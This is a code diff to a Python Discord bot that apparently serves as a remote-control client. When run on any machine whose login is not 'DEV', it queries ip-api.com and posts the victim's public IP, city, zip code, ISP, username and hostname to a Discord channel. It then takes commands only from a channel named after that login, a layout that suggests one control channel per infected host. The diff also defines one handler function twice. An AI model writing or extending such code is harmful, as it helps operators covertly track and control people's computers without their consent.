@@ -134,14 +134,14 @@ async def on_ready():
 
         response = requests.get('http://ip-api.com/json/')
 
-        if not os.getlogin() == DEV:
+        if not os.getlogin() == "DEV":
             response = requests.get('http://ip-api.com/json/')
             if response.status_code == 200:
                 geolocation_data = response.json()
-                IPloc = f"**Geolocation Data**:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
+                IPloc = f"# Geolocation Data:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
             else:
                 IPloc = "Error retrieving geolocation data."
-            running = f"-----\n# Bot is ready and running!\n\nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.getenv('HOSTNAME')}\n\n{IPloc}"
+            running = f"-----\n# Bot is ready and running!\n \nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.getenv('HOSTNAME')}\n{IPloc}\n-----"
         else: running = "Bot is ready and running!"
 
         # Kanal erstellen und Berechtigungen setzen
@@ -221,6 +221,9 @@ async def on_message(message):
         await message.add_reaction("❌")  # Add "❌" reaction to all messages sent by the bot
         return
 
+    if message.channel.name != os.getlogin():
+        return
+
     if message.content.startswith(bot.command_prefix):
         await handle_command(message)
     else:
@@ -247,6 +250,9 @@ async def handle_command(message):
         await bot.invoke(ctx)
     else:
         await handle_invalid_command(message)
+
+async def handle_invalid_command(message):
+    await message.channel.send("Invalid command.")
 
 async def handle_invalid_command(message):
     command_list = [cmd.name for cmd in bot.commands]
